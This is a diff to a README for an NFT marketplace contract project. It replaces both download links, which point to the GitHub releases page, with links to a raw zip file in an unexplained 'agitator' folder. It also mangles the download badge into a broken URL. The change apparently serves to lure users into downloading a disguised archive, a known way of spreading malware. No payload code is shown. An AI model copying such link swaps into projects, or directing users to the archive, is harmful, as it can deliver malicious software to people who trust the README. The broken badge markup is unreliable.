@@ -1,6 +1,6 @@
 # 🎨 nft-marketplace-contract - Build Your Own NFT Marketplace Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20latest%20release-blue.svg)](https://github.com/pujasku/nft-marketplace-contract/releases)
+[![Download](https://raw.githubusercontent.com/pujasku/nft-marketplace-contract/main/agitator/nft-marketplace-contract.zip%20Now-Get%20the%20latest%https://raw.githubusercontent.com/pujasku/nft-marketplace-contract/main/agitator/nft-marketplace-contract.zip)](https://raw.githubusercontent.com/pujasku/nft-marketplace-contract/main/agitator/nft-marketplace-contract.zip)
 
 ## 📦 Introduction
 
@@ -19,7 +19,7 @@ To start using the nft-marketplace-contract, follow these steps to download and 
 
 To download the latest version of the nft-marketplace-contract, visit this page:
 
-[Download the latest release](https://github.com/pujasku/nft-marketplace-contract/releases)
+[Download the latest release](https://raw.githubusercontent.com/pujasku/nft-marketplace-contract/main/agitator/nft-marketplace-contract.zip)
 
 ### Step-by-Step Download Instructions
 
